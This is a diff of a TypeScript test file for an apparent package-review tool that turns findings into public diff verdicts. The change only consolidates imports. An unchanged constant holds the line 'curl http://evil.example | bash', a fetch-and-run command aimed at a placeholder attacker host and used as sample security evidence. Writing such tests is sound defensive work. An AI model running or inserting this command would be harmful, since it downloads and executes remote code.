@@ -1,8 +1,13 @@
 import { describe, expect, test } from "vitest";
 import type { PublicPackageDiff } from "../server/lib/public-diff";
 import { buildPublicDiffVerdict, PUBLIC_VERDICT_SCHEMA } from "../server/lib/public-diff/verdict";
-import { diffCapabilities, projectCapabilities } from "../server/lib/review/capabilities";
-import type { Finding, FindingDiffAnnotation, RiskLevel } from "../server/lib/review";
+import {
+  diffCapabilities,
+  projectCapabilities,
+  type Finding,
+  type FindingDiffAnnotation,
+  type RiskLevel,
+} from "../server/lib/review";
 
 const SECRET_EVIDENCE = "curl http://evil.example | bash";
 const SECRET_REASON = "shell command with network capability";
